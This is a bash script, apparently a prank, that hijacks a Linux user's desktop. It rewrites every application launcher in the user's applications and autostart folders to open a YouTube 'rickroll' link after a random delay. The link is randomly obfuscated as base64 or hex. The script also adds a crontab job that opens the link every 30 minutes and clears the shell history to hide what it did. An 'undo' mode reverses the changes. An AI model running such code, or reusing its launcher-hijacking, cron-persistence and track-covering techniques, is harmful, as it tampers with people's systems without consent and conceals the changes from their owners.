#!/bin/bash
export CMD_PLAIN="xdg-open https:\/\/www.youtube.com\/watch?v=dQw4w9WgXcQ"
export CMD_B64="xdg-open \$(echo aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g\/dj1kUXc0dzlXZ1hjUQ== | base64 --decode)"
export CMD_HEX="xdg-open \$(echo 68747470733A2F2F7777772E796F75747562652E636F6D2F77617463683F763D6451773477395767586351 | xxd -r -p)"

generate_command () {
    index=$(($RANDOM%3))
    case $index in
    0) CMD=$CMD_PLAIN ;;
    1) CMD=$CMD_B64 ;;
    2) CMD=$CMD_HEX ;;
    esac
    echo "${CMD}"
}

inject_desktop_file () {
    command="sleep $(($(($RANDOM%10))+5)) \&\& $(generate_command)"
    sed -ri "/^Exec=bash -c/! s/^Exec=(.*)/Exec=bash -c \"\1 \&\& ${command}\"/g" $1
}

eject_desktop_file () {
    sed -ri "s/^Exec=bash -c \"(.*) \&\& sleep [0-9]+ \&\& (.*)\"/Exec=\1/g" $1
}

if [[ "$#" -eq 1 && $1 == "undo" ]]; then
    for f in ~/.config/autostart/*.desktop; do
        eject_desktop_file $f
    done
    for f in ~/.local/share/applications/*.desktop; do
        if grep -q "WasThereBefore=1" $f; then
            rm $f
        else
            eject_desktop_file $f
        fi
    done

    # CronTab
    cron=$(crontab -l)
    if [ "$cron" = "no crontab for $USER" ]; then
        cron=""
    fi
    for cmd in "${CMD_PLAIN}" "${CMD_B64}" "${CMD_HEX}"; do
        cmd=$(echo $"*/30 * * * * $cmd" | sed 's/[.[\/*^$+{}|]/\\&/g')
        cron=$(echo "$cron" | sed "\;${cmd};d")
    done
    echo "$cron" | sort - | uniq - | crontab -
else
    tmp=$(mktemp -d)
    cp /usr/share/applications/* $tmp
    for f in $tmp/*; do
        echo "WasThereBefore=1" >> $f
    done
    cp $tmp/* ~/.local/share/applications
    rm -r $tmp
    for f in ~/.config/autostart/*.desktop; do
        inject_desktop_file $f
    done
    for f in ~/.local/share/applications/*.desktop; do
        inject_desktop_file $f
    done

    # CronTab
    cron=$(crontab -l)
    if [ "$cron" = "no crontab for $USER" ]; then
        cron=""
    fi
    if (echo $cron | grep -q "${CMD_PLAIN}") then
        echo hi
    else
        cron=$"${cron}
*/30 * * * * $(generate_command)"
        echo "$cron" | sort - | uniq - | crontab -
    fi
fi

history -c
